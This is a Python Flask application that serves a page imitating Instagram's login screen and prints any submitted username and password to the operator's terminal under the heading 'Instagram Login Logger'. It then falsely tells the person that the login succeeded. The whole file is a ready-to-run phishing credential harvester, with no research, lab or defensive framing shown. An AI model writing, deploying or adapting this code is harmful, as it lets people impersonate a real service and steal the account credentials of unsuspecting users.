from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML template styled to look like Instagram's login page
login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #fafafa;
        }
        .login-container {
            background: #FFFFFF;
            width: 350px;
            margin: auto;
            position: relative;
            top: 50%;
            transform: translateY(-50%);
            padding: 20px 40px 40px;
            border: 1px solid #dbdbdb;
            text-align: center;
            box-shadow: 2px 2px 3px rgba(0,0,0,0.1);
        }
        form {
            margin-top: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 88%;
            height: 38px;
            padding: 9px 0 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 88%;
            height: 30px;
            background-color: #0095f6;
            border: none;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        .or {
            margin: 10px 0;
            color: #8e8e8e;
        }
        .fb-login {
            margin-top: 10px;
            font-size: 14px;
            color: #385185;
            cursor: pointer;
            font-weight: bold;
        }
        .sign-up {
            margin-top: 20px;
        }
        a {
            text-decoration: none;
            color: #0095f6;
            font-weight: bold;
        }
        .forgot {
            font-size: 12px;
            line-height: 1.5;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required><br><br>
            <input type="password" name="password" placeholder="Password" required><br><br>
            <input type="submit" value="Log In">
        </form>
        <div class="or">OR</div>
        <div class="fb-login">Log in with Facebook</div>
        <div class="forgot">Forgot password?</div>
        <div class="sign-up">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>
"""

# Define ANSI color codes
class TerminalColors:
    # Text colors
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

    # Formatting
    BOLD = '\033[1m'
    RESET = '\033[0m'


def print_welcome_message():
    print(f"{TerminalColors.BOLD}{TerminalColors.CYAN}Welcome to the Instagram Login Logger!{TerminalColors.RESET}\n")
    print(f"{TerminalColors.BOLD}{TerminalColors.YELLOW}Your credentials will be logged below:{TerminalColors.RESET}\n")


def print_login_details(username, password):
    print(
        f"{TerminalColors.BOLD}{TerminalColors.CYAN}Username:{TerminalColors.RESET} {TerminalColors.WHITE}{username}{TerminalColors.RESET}")
    print(
        f"{TerminalColors.BOLD}{TerminalColors.MAGENTA}Password:{TerminalColors.RESET} {TerminalColors.WHITE}{password}{TerminalColors.RESET}")
    print(
        f"{TerminalColors.BOLD}{TerminalColors.BLUE}Visit our support page for help: https://support.instagram.com{TerminalColors.RESET}")
    print("\n" + "="*40 + "\n")


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Print credentials with colors and styling
        print_welcome_message()
        print_login_details(username, password)

        # Optionally render a response or redirect
        return "Login successful! (Credentials logged in terminal)"

    return render_template_string(login_page)


if __name__ == '__main__':
    # Run the Flask application
    app.run(debug=True, port=8080)

